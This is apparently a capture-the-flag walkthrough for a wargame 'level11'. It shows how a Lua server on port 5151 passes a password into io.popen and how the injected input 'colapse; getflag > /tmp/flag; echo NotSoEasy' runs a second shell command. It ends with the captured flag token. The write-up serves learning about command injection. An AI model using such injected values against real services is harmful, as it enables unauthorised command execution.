cat level11.lua

we can see a lot of code, but the main thing is that create a webserver listening on PORT 5151
we can also see it use a lua function popen(), this function execute a shell command and return his result

so this is a basic exploit, execute an elevated command to get the flag

the line:
> prog = io.popen("echo "..pass.." | sha1sum", "r")

step 1/
nc localhost 5151

step 2/ the serv prompt to a password
colapse; getflag > /tmp/flag; echo NotSoEasy

step 3/
cat /tmp/flag to retrieve the flag

Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
